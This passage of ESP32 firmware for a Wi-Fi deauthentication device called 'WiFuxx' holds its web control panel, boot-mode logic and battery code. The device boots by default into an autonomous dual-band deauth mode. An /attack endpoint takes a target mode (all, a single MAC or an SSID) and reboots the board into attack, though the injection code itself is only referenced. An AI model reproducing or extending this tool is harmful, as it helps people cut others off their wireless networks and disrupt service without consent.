    if (!json) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, NULL); return ESP_FAIL; }

    cJSON *mode_j   = cJSON_GetObjectItem(json, "mode");
    const char *mode = (mode_j && cJSON_IsString(mode_j)) ? mode_j->valuestring : "all";

    uint32_t sel = SEL_MODE_ALL;
    uint8_t  mac[6] = {0};
    char     ssid[33] = {0};
    bool     ok = true;

    if (strcmp(mode, "single") == 0) {
        cJSON *mac_j = cJSON_GetObjectItem(json, "mac");
        if (mac_j && cJSON_IsString(mac_j) && parse_mac(mac_j->valuestring, mac))
            sel = SEL_MODE_SINGLE;
        else
            ok = false;
    } else if (strcmp(mode, "dualband") == 0) {
        cJSON *ssid_j = cJSON_GetObjectItem(json, "ssid");
        if (ssid_j && cJSON_IsString(ssid_j)) {
            strncpy(ssid, ssid_j->valuestring, sizeof(ssid) - 1);
            sel = SEL_MODE_DUALBAND;
        } else {
            ok = false;
        }
    }
    cJSON_Delete(json);

    if (!ok) {
        httpd_resp_set_status(req, "400 Bad Request");
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"error\":\"bad target\"}");
        return ESP_OK;
    }

    g_sel_mode = sel;
    memcpy(g_sel_mac, mac, sizeof(g_sel_mac));
    strncpy(g_sel_ssid, ssid, sizeof(g_sel_ssid) - 1);
    g_sel_ssid[sizeof(g_sel_ssid) - 1] = '\0';

    ESP_LOGW(TAG, "WebUI attack request: mode=%s -> reboot into ATTACK", mode);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");

    reboot_into(BOOT_MODE_ATTACK);  // short delay (response flush) then esp_restart()
    return ESP_OK;                  // not reached
}

// ==================== WebUI: Settings (GET/POST /config, POST /config/reset) ====================
static int clampi(int v, int lo, int hi) { return v < lo ? lo : (v > hi ? hi : v); }

// GET /config — current settings as JSON. ui_pass is never sent back.
static esp_err_t config_get_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;

    cJSON *o = cJSON_CreateObject();
    cJSON_AddStringToObject(o, "ap_ssid",     g_settings.ap_ssid);
    cJSON_AddNumberToObject(o, "ap_channel",  g_settings.ap_channel);
    cJSON_AddNumberToObject(o, "thr_24",      g_settings.thr_24);
    cJSON_AddNumberToObject(o, "thr_5",       g_settings.thr_5);
    cJSON_AddNumberToObject(o, "burst_24",    g_settings.burst_24);
    cJSON_AddNumberToObject(o, "burst_5",     g_settings.burst_5);
    cJSON_AddStringToObject(o, "ui_user",     g_settings.ui_user);
    cJSON_AddBoolToObject  (o, "skip_splash", g_settings.skip_splash);

    char *out = cJSON_PrintUnformatted(o);
    cJSON_Delete(o);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, out ? out : "{}");
    cJSON_free(out);
    return ESP_OK;
}

// POST /config — partial update; only the fields present in the body change.
// ui_pass is updated only when supplied, so it survives edits to other fields.
static esp_err_t config_post_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;

    char buf[512];
    int n = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (n <= 0) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, NULL); return ESP_FAIL; }
    buf[n] = '\0';

    cJSON *j = cJSON_Parse(buf);
    if (!j) { httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, NULL); return ESP_FAIL; }

    cJSON *it;
    if ((it = cJSON_GetObjectItem(j, "ap_ssid")) && cJSON_IsString(it) && it->valuestring[0]) {
        strncpy(g_settings.ap_ssid, it->valuestring, sizeof(g_settings.ap_ssid) - 1);
        g_settings.ap_ssid[sizeof(g_settings.ap_ssid) - 1] = '\0';
    }
    if ((it = cJSON_GetObjectItem(j, "ap_channel")) && cJSON_IsNumber(it))
        g_settings.ap_channel = clampi(it->valueint, 1, 13);
    if ((it = cJSON_GetObjectItem(j, "thr_24")) && cJSON_IsNumber(it))
        g_settings.thr_24 = clampi(it->valueint, -95, -30);
    if ((it = cJSON_GetObjectItem(j, "thr_5")) && cJSON_IsNumber(it))
        g_settings.thr_5 = clampi(it->valueint, -95, -30);
    if ((it = cJSON_GetObjectItem(j, "burst_24")) && cJSON_IsNumber(it))
        g_settings.burst_24 = clampi(it->valueint, 1, 200);
    if ((it = cJSON_GetObjectItem(j, "burst_5")) && cJSON_IsNumber(it))
        g_settings.burst_5 = clampi(it->valueint, 1, 200);
    if ((it = cJSON_GetObjectItem(j, "ui_user")) && cJSON_IsString(it)) {
        strncpy(g_settings.ui_user, it->valuestring, sizeof(g_settings.ui_user) - 1);
        g_settings.ui_user[sizeof(g_settings.ui_user) - 1] = '\0';
    }
    if ((it = cJSON_GetObjectItem(j, "ui_pass")) && cJSON_IsString(it)) {
        strncpy(g_settings.ui_pass, it->valuestring, sizeof(g_settings.ui_pass) - 1);
        g_settings.ui_pass[sizeof(g_settings.ui_pass) - 1] = '\0';
    }
    if ((it = cJSON_GetObjectItem(j, "skip_splash")) && cJSON_IsBool(it))
        g_settings.skip_splash = cJSON_IsTrue(it);
    cJSON_Delete(j);

    esp_err_t e = settings_save();
    httpd_resp_set_type(req, "application/json");
    if (e == ESP_OK) {
        httpd_resp_sendstr(req, "{\"ok\":true}");
    } else {
        httpd_resp_set_status(req, "500 Internal Server Error");
        httpd_resp_sendstr(req, "{\"error\":\"save failed\"}");
    }
    return ESP_OK;
}

// POST /config/reset — wipe to factory defaults.
static esp_err_t config_reset_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;
    settings_reset();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

// POST /charge — reboot into low-power CHARGE mode (Wi-Fi off). Leaving it is the
// board's power switch, so there's no in-band way back; the UI confirms first.
static esp_err_t charge_post_handler(httpd_req_t *req) {
    if (!webui_authorized(req)) return ESP_OK;
    ESP_LOGW(TAG, "WebUI charge request -> reboot into CHARGE");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    reboot_into(BOOT_MODE_CHARGE);  // short delay (response flush) then esp_restart()
    return ESP_OK;                  // not reached
}

// ==================== WebUI: HTTP Server ====================
static httpd_handle_t http_server = NULL;

static void http_server_start(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_open_sockets = 7;    // LWIP cap: httpd reserves 3, so 7 is the safe max
    config.max_uri_handlers = 12;   // we register 8; headroom for future routes
    config.task_priority    = 4;
    config.stack_size       = 8192;
    config.lru_purge_enable = true;

    if (httpd_start(&http_server, &config) != ESP_OK) {
        ESP_LOGE(TAG, "HTTP server start failed");
        return;
    }

    httpd_uri_t uris[] = {
        { .uri = "/",             .method = HTTP_GET,  .handler = root_get_handler    },
        { .uri = "/favicon.ico",  .method = HTTP_GET,  .handler = favicon_get_handler },
        { .uri = "/scan",         .method = HTTP_GET,  .handler = scan_get_handler    },
        { .uri = "/attack",       .method = HTTP_POST, .handler = attack_post_handler },
        { .uri = "/config",       .method = HTTP_GET,  .handler = config_get_handler  },
        { .uri = "/config",       .method = HTTP_POST, .handler = config_post_handler },
        { .uri = "/config/reset", .method = HTTP_POST, .handler = config_reset_handler },
        { .uri = "/charge",       .method = HTTP_POST, .handler = charge_post_handler },
    };
    for (int i = 0; i < (int)(sizeof(uris) / sizeof(uris[0])); i++)
        httpd_register_uri_handler(http_server, &uris[i]);

    ESP_LOGI(TAG, "WebUI HTTP server running at http://%s", WEBUI_AP_IP);
}

// ==================== WebUI: mDNS (wifuxx.local) ====================
// Lets phones reach the panel by name as well as by IP. Note: iOS/macOS resolve
// .local out of the box; many Android browsers still need the raw IP, so the
// connect screen keeps showing 192.168.42.42 too.
static void mdns_webui_start(void) {
    if (mdns_init() != ESP_OK) {
        ESP_LOGW(TAG, "mDNS init failed — use http://%s", WEBUI_AP_IP);
        return;
    }
    mdns_hostname_set(WEBUI_MDNS_HOST);
    mdns_instance_name_set("WiFuxx Control");
    mdns_service_add(NULL, "_http", "_tcp", 80, NULL, 0);
    ESP_LOGI(TAG, "mDNS up: http://%s.local (or http://%s)", WEBUI_MDNS_HOST, WEBUI_AP_IP);
}

// ==================== WebUI: Wi-Fi (AP for phone + STA so /scan works) ====================
static void wifi_init_apsta_webui(void) {
    led_state = LED_STATE_WIFI_INIT;
    esp_netif_init();
    esp_event_loop_create_default();
    esp_netif_create_default_wifi_sta();
    esp_netif_t *ap_netif = esp_netif_create_default_wifi_ap();

    // Static IP on the AP netif: stop DHCP server, assign, restart it.
    esp_netif_ip_info_t ip_info = {0};
    ip_info.ip.addr      = esp_ip4addr_aton(WEBUI_AP_IP);
    ip_info.gw.addr      = esp_ip4addr_aton(WEBUI_AP_IP);
    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
    esp_netif_dhcps_stop(ap_netif);
    esp_netif_set_ip_info(ap_netif, &ip_info);
    esp_netif_dhcps_start(ap_netif);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_APSTA);

    wifi_config_t ap_config = {
        .ap = {
            .password        = "",
            .max_connection  = WEBUI_AP_MAX_CONN,
            .authmode        = WIFI_AUTH_OPEN,
            .beacon_interval = 100,
        },
    };
    // SSID and channel come from user settings (NVS), applied at boot.
    strncpy((char *)ap_config.ap.ssid, g_settings.ap_ssid, sizeof(ap_config.ap.ssid) - 1);
    ap_config.ap.ssid_len = strlen((char *)ap_config.ap.ssid);
    ap_config.ap.channel  = g_settings.ap_channel;
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    // No promiscuous mode in WebUI — raw deauth injection only runs in ATTACK boot.

    ESP_LOGI(TAG, "WebUI SoftAP '%s' (ch %d) up; open http://%s",
             g_settings.ap_ssid, g_settings.ap_channel, WEBUI_AP_IP);
}

// ==================== BOOT Button: hold to enter WebUI ====================
// ATTACK boot only. A clean continuous 2s LOW on GPIO9 reboots into WebUI mode.
static void button_task(void *pvParameters) {
    gpio_config_t io = {
        .pin_bit_mask = 1ULL << BOOT_BUTTON_GPIO,
        .mode         = GPIO_MODE_INPUT,
        .pull_up_en   = GPIO_PULLUP_ENABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type    = GPIO_INTR_DISABLE,
    };
    gpio_config(&io);

    int last = gpio_get_level(BOOT_BUTTON_GPIO);
    ESP_LOGI(TAG, "button_task watching GPIO%d (idle=%d; a press should read 0). Hold 2s for WebUI.",
             BOOT_BUTTON_GPIO, last);

    uint32_t held_ms = 0;
    while (1) {
        int level = gpio_get_level(BOOT_BUTTON_GPIO);
        if (level != last) {            // log every edge so the pin's wiring is visible on serial
            ESP_LOGW(TAG, "GPIO%d -> %s", BOOT_BUTTON_GPIO,
                     level == 0 ? "LOW (pressed)" : "HIGH (released)");
            last = level;
        }
        if (level == 0) {               // active LOW = pressed
            held_ms += BUTTON_POLL_MS;
            if (held_ms >= BUTTON_HOLD_MS) {
                ESP_LOGW(TAG, "BOOT held %lums -> entering WebUI", (unsigned long)held_ms);
                reboot_into(BOOT_MODE_WEBUI);
            }
        } else {
            held_ms = 0;   // released before 2s — reset, require a clean hold
        }
        vTaskDelay(pdMS_TO_TICKS(BUTTON_POLL_MS));
    }
}

// ==================== BOOT Button: hold to factory-reset (WebUI mode) ====================
// WebUI boot only. The button does nothing else here, so a long 10s hold is a
// safe "lockout escape": if a user sets a WebUI password and forgets it, holding
// BOOT wipes settings (incl. auth) back to defaults and reboots into a fresh,
// open WebUI. Does not affect the 2s hold-to-enter-WebUI in ATTACK mode.
static void webui_button_task(void *pvParameters) {
    gpio_config_t io = {
        .pin_bit_mask = 1ULL << BOOT_BUTTON_GPIO,
        .mode         = GPIO_MODE_INPUT,
        .pull_up_en   = GPIO_PULLUP_ENABLE,
        .pull_down_en = GPIO_PULLDOWN_DISABLE,
        .intr_type    = GPIO_INTR_DISABLE,
    };
    gpio_config(&io);

    ESP_LOGI(TAG, "webui_button_task watching GPIO%d — hold %ds to factory-reset.",
             BOOT_BUTTON_GPIO, BUTTON_RESET_HOLD_MS / 1000);

    uint32_t held_ms = 0;
    while (1) {
        if (gpio_get_level(BOOT_BUTTON_GPIO) == 0) {   // active LOW = pressed
            held_ms += BUTTON_POLL_MS;
            if (held_ms >= BUTTON_RESET_HOLD_MS) {
                ESP_LOGW(TAG, "BOOT held %lums in WebUI -> FACTORY RESET", (unsigned long)held_ms);
                settings_reset();
                g_webui_resetting = true;            // display_task shows confirmation
                vTaskDelay(pdMS_TO_TICKS(2500));     // let the user read it
                reboot_into(BOOT_MODE_WEBUI);        // come back up fresh + open
            }
        } else {
            held_ms = 0;   // released — require a clean continuous hold
        }
        vTaskDelay(pdMS_TO_TICKS(BUTTON_POLL_MS));
    }
}

// ==================== Boot Splash (serial) ====================
// Prints monitor_bitmap (80x80) as ASCII art to the serial monitor
static void log_boot_splash(void) {
    char row[81];
    for (int r = 0; r < 40; r++) {
        for (int i = 0; i < 80; i++) {
            row[i] = (monitor_bitmap[r * 10 + i / 8] & (0x80 >> (i % 8))) ? '#' : ' ';
        }
        row[80] = '\0';
        ESP_LOGI(TAG, "%s", row);
    }
}

// ==================== Battery Sense + Charge Mode ====================
#include "esp_adc/adc_oneshot.h"
#include "esp_adc/adc_cali.h"
#include "esp_adc/adc_cali_scheme.h"
#include "esp_sleep.h"

static adc_oneshot_unit_handle_t batt_adc  = NULL;
static adc_cali_handle_t         batt_cali = NULL;
static adc_channel_t             batt_chan;
static int  batt_mv    = 0;       // smoothed battery millivolts
static bool batt_valid = false;

static void battery_init(void) {
    // GPIO26 enables the XIAO's on-board divider; keep it low until we sample.
    gpio_config_t en = { .pin_bit_mask = 1ULL << BATTERY_EN_GPIO, .mode = GPIO_MODE_OUTPUT };
    gpio_config(&en);
    gpio_set_level(BATTERY_EN_GPIO, 0);

    adc_unit_t unit;
    if (adc_oneshot_io_to_channel(BATTERY_ADC_GPIO, &unit, &batt_chan) != ESP_OK || unit != ADC_UNIT_1) {
        ESP_LOGE(TAG, "Battery: GPIO%d is not an ADC1 pin", BATTERY_ADC_GPIO);
        return;
    }
    adc_oneshot_unit_init_cfg_t ucfg = { .unit_id = ADC_UNIT_1 };
    if (adc_oneshot_new_unit(&ucfg, &batt_adc) != ESP_OK) { batt_adc = NULL; return; }

    adc_oneshot_chan_cfg_t ccfg = { .atten = ADC_ATTEN_DB_12, .bitwidth = ADC_BITWIDTH_DEFAULT };
    adc_oneshot_config_channel(batt_adc, batt_chan, &ccfg);

    adc_cali_curve_fitting_config_t cal = {
        .unit_id = ADC_UNIT_1, .chan = batt_chan,
        .atten = ADC_ATTEN_DB_12, .bitwidth = ADC_BITWIDTH_DEFAULT,
    };
    if (adc_cali_create_scheme_curve_fitting(&cal, &batt_cali) != ESP_OK) {
        ESP_LOGW(TAG, "Battery: ADC calibration unavailable; readings approximate");
        batt_cali = NULL;
    }
    ESP_LOGI(TAG, "Battery sense on GPIO%d (ADC1 ch%d), enable GPIO%d",
             BATTERY_ADC_GPIO, (int)batt_chan, BATTERY_EN_GPIO);
}

// Enable the divider, average a burst, convert to mV, undo the /2, low-pass with
// an EMA, then disable the divider again to stop its drain.
static void battery_update(void) {
    if (!batt_adc) return;
    gpio_set_level(BATTERY_EN_GPIO, 1);
    vTaskDelay(pdMS_TO_TICKS(20));   // let the RC divider settle

    int acc = 0, n = 0, raw;
    for (int i = 0; i < BATTERY_SAMPLES; i++)
        if (adc_oneshot_read(batt_adc, batt_chan, &raw) == ESP_OK) { acc += raw; n++; }

    gpio_set_level(BATTERY_EN_GPIO, 0);
    if (n == 0) return;

    int raw_avg = acc / n, mv_node;
    if (batt_cali) {
        if (adc_cali_raw_to_voltage(batt_cali, raw_avg, &mv_node) != ESP_OK) return;
    } else {
        mv_node = raw_avg * 3300 / 4095;   // rough fallback if uncalibrated
    }
    int sample_mv = mv_node * BATTERY_DIVIDER_RATIO;
    batt_mv = batt_valid ? batt_mv + (sample_mv - batt_mv) / BATTERY_EMA_DEN : sample_mv;
    batt_valid = true;
}

static int battery_percent(void) {
    int p = (batt_mv - BATTERY_EMPTY_MV) * 100 / (BATTERY_FULL_MV - BATTERY_EMPTY_MV);
    return p < 0 ? 0 : (p > 100 ? 100 : p);
}

// Charge mode: never starts Wi-Fi. Shows a one-line battery readout, then light-
// sleeps between refreshes so the SGM40567 charger gets nearly all the current.
// Exit is the board's power switch (off to store; on = cold boot -> autonomous).
static void charge_mode_run(void) {
    ESP_LOGW(TAG, "CHARGE mode: Wi-Fi off. Unplug when the XIAO 'C' LED goes out.");
    battery_init();
    oled_clear_screen();
    oled_set_contrast(CHARGE_OLED_CONTRAST);   // dim the panel — every mA helps the charge
    esp_sleep_enable_timer_wakeup((uint64_t)CHARGE_UPDATE_SEC * 1000000ULL);

    char line[17];
    while (1) {
        // Wi-Fi is off here, so there's no TX sag to smooth — reset the EMA each
        // pass so the readout tracks the live battery voltage with no lag.
        batt_valid = false;
        battery_update();

        // Single dim line — fewest lit pixels = least OLED draw. The XIAO 'C' LED
        // is the real charge indicator (out = full).
        oled_clear_page(2);
        if (batt_valid && batt_mv >= BATTERY_PRESENT_MIN_MV) {
            int v10 = batt_mv / 10;                 // centivolts
            if (v10 < 0)   v10 = 0;
            if (v10 > 999) v10 = 999;               // clamp -> 0.00..9.99 V
            int pct = battery_percent();
            if (pct < 0)   pct = 0;
            if (pct > 100) pct = 100;
            snprintf(line, sizeof(line), "Batt %d.%02dV %d%%", v10 / 100, v10 % 100, pct);
        } else {
            snprintf(line, sizeof(line), "Charging...");
        }
        oled_draw_string(0, 2, line);
        oled_flush();

        esp_light_sleep_start();   // ~CHARGE_UPDATE_SEC; OLED holds the line meanwhile
    }
}

// ==================== Main ====================
void app_main(void) {
    boot_mode_init();   // pick ATTACK (default) or WEBUI from persisted RTC state

    // NVS up first so user settings (incl. skip_splash) are available before the
    // splash and before Wi-Fi/attack config reads any tunables.
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    settings_load();

    if (!g_settings.skip_splash) log_boot_splash();

    status_led_init();
    led_state = LED_STATE_BOOT;
    xTaskCreate(status_led_task, "status_led", 2048, NULL, 1, NULL);

    // Common peripherals
    oled_init();
    display_mutex = xSemaphoreCreateMutex();

    if (g_boot_mode == BOOT_MODE_CHARGE) {
        // -------- Charge mode: Wi-Fi off, low power, battery readout --------
        charge_mode_run();   // never returns (power switch / cold boot to leave)
    }

    if (g_boot_mode == BOOT_MODE_WEBUI) {
        // -------- WebUI mode: SoftAP + HTTP control panel, no attack --------
        g_webui_display = true;                       // display_task draws the connect screen
        strcpy(current_display_info.status, "WEBUI");
        xTaskCreate(display_task, "display", 4096, NULL, 2, NULL);

        wifi_init_apsta_webui();
        led_state = LED_STATE_WEBUI_IDLE;             // solid orange
        http_server_start();
        mdns_webui_start();                           // http://wifuxx.local
        xTaskCreate(webui_button_task, "webui_btn", 2048, NULL, 3, NULL);  // hold BOOT 10s = factory reset

        ESP_LOGI(TAG, "WebUI mode ready — join '%s', open http://%s or http://%s.local",
                 g_settings.ap_ssid, WEBUI_AP_IP, WEBUI_MDNS_HOST);
    } else {
        // -------- Attack mode (default): autonomous dual-band deauth --------
        xTaskCreate(display_task, "display", 4096, NULL, 2, NULL);

        wifi_init_sta();
        xTaskCreate(button_task, "button", 2048, NULL, 3, NULL);
        xTaskCreate(autonomous_mode_task, "auto_mode", 8192, NULL, 5, NULL);
        ESP_LOGI(TAG, "Autonomous attack mode started (hold BOOT 2s for WebUI)");
    }

    while (1) vTaskDelay(pdMS_TO_TICKS(10000));
}
